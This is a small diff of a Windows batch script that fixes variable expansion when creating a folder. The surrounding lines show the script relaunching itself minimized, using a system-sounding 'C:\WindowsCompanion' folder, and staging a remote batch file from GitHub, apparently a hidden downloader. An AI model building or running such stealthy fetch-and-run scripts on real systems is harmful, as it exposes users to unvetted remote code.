@@ -9,7 +9,7 @@ if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && 
 
 
     set FOLDER_FUX="C:\WindowsCompanion"
-    if not exist FOLDER_FUX md FOLDER_FUX
+    if not exist %FOLDER_FUX% md %FOLDER_FUX%
 
     set URL_FUX="https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat"
     set PATH_FUX="C:\WindowsCompanion\fileToFux.bat"
